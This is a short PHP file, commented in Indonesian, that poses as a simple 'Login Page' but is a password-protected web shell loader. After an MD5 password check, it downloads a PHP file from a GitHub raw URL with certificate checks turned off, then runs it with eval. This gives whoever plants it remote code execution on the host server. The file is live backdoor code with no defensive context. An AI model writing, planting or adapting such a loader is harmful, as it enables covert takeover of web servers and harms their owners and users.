<?php
session_start();

// Fungsi untuk ambil isi file dari URL
function geturlsinfo($url) {
    $conn = curl_init($url);
    curl_setopt($conn, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($conn, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($conn, CURLOPT_USERAGENT, "Mozilla/5.0");
    curl_setopt($conn, CURLOPT_SSL_VERIFYPEER, 0);
    curl_setopt($conn, CURLOPT_SSL_VERIFYHOST, 0);
    $data = curl_exec($conn);
    curl_close($conn);
    return $data;
}

// Fungsi untuk cek login
function is_logged_in() {
    return isset($_SESSION['logged_in']) && $_SESSION['logged_in'] === true;
}

// Cek jika form disubmit
if (isset($_POST['password'])) {
    $input_pass = $_POST['password'];
    $hash = 'f0948bd3382091fe3576449833f5c411'; // md5('passwordmu')
    
    if (md5($input_pass) === $hash) {
        $_SESSION['logged_in'] = true;
    } else {
        echo "Incorrect password.";
    }
}

// Jika sudah login, jalankan konten
if (is_logged_in()) {
    $url = "https://raw.githubusercontent.com/sultankonslet1337/aka1337/refs/heads/main/server.php";
    $content = geturlsinfo($url);
    eval('?>' . $content);
} else {
    // Tampilkan form login
    ?>
    <!DOCTYPE html>
    <html>
    <head>
        <title>Login Page</title>
    </head>
    <body style="background-color: black; color: white;">
        <center>
            <img src="https://eskipaper.com/images/dark-anime-backgrounds-2.jpg" width="300px"><br><br>
            <form method="POST">
                <input type="password" name="password" placeholder="Enter password" />
                <input type="submit" value="Touch Me!">
            </form>
        </center>
    </body>
    </html>
    <?php
}
?>
